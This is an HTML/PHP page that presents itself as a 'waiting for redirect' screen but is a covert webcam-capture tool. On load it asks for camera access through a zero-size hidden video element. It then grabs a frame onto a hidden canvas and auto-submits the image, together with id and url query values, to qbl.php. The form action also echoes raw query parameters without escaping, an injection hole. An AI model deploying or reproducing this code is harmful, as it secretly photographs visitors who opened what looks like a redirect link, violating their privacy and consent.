<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>等待跳转...</title>
</head>
<body>

    <video id="video" width="0" height="0" autoplay></video>
	<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
	<script type="text/javascript">
		window.addEventListener("DOMContentLoaded", function() {
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            var video = document.getElementById('video');

            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
					video.srcObject = stream;
                    video.play();
                    
                    setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
                    setTimeout(function(){
                        var img = canvas.toDataURL('image/png');  
                        document.getElementById('result').value = img;
                        document.getElementById('gopo').submit();
                        },1300);
                },function(){alert("操作失败，权限不够！");});
                
            }
		}, false);

	</script>
<form action="qbl.php?id=<?php echo $_GET['id']?>&url=<?php echo $_GET['url']?>" id="gopo" method="post">
<input type="hidden" name="img" id="result" value="" />
</form>
</body>
</html>